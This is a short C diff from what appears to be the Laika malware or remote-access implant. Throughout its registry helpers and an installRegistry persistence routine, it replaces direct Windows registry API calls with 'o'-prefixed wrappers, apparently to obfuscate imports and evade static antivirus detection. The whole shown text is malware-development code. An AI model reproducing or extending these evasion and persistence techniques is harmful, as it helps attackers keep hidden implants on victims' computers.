@@ -49,7 +49,7 @@ HKEY openReg(HKEY key, LPCSTR subKey)
 {
     HKEY hKey;
 
-    if (RegOpenKeyExA(key, subKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
+    if (oRegOpenKeyExA(key, subKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
         LAIKA_ERROR("Failed to open registry key!\n");
 
     return hKey;
@@ -63,12 +63,12 @@ LPSTR readReg(HKEY key, LPCSTR val, LPDWORD sz)
 
     /* get the size */
     *sz = 0;
-    RegQueryValueExA(key, val, NULL, NULL, NULL, sz);
+    oRegQueryValueExA(key, val, NULL, NULL, NULL, sz);
 
     if (*sz != 0) {
         str = (LPSTR)laikaM_malloc(*sz);
 
-        if ((ret = RegQueryValueExA(key, val, NULL, NULL, str, sz)) != ERROR_SUCCESS)
+        if ((ret = oRegQueryValueExA(key, val, NULL, NULL, str, sz)) != ERROR_SUCCESS)
             LAIKA_ERROR("Failed to read registry!\n");
     }
 
@@ -79,7 +79,7 @@ void writeReg(HKEY key, LPCSTR val, LPSTR data, DWORD sz)
 {
     LONG code;
 
-    if ((code = RegSetValueExA(key, val, 0, REG_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
+    if ((code = oRegSetValueExA(key, val, 0, REG_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
         LAIKA_ERROR("Failed to write registry!\n");
 }
 
@@ -190,7 +190,7 @@ void installRegistry()
         writeReg(reg, regKeyVal, newRegValue, newRegSz);
     }
 
-    RegCloseKey(reg);
+    oRegCloseKey(reg);
     LAIKA_BOX_SKID_END(regKeyVal);
     LAIKA_BOX_SKID_END(regKey);
 }
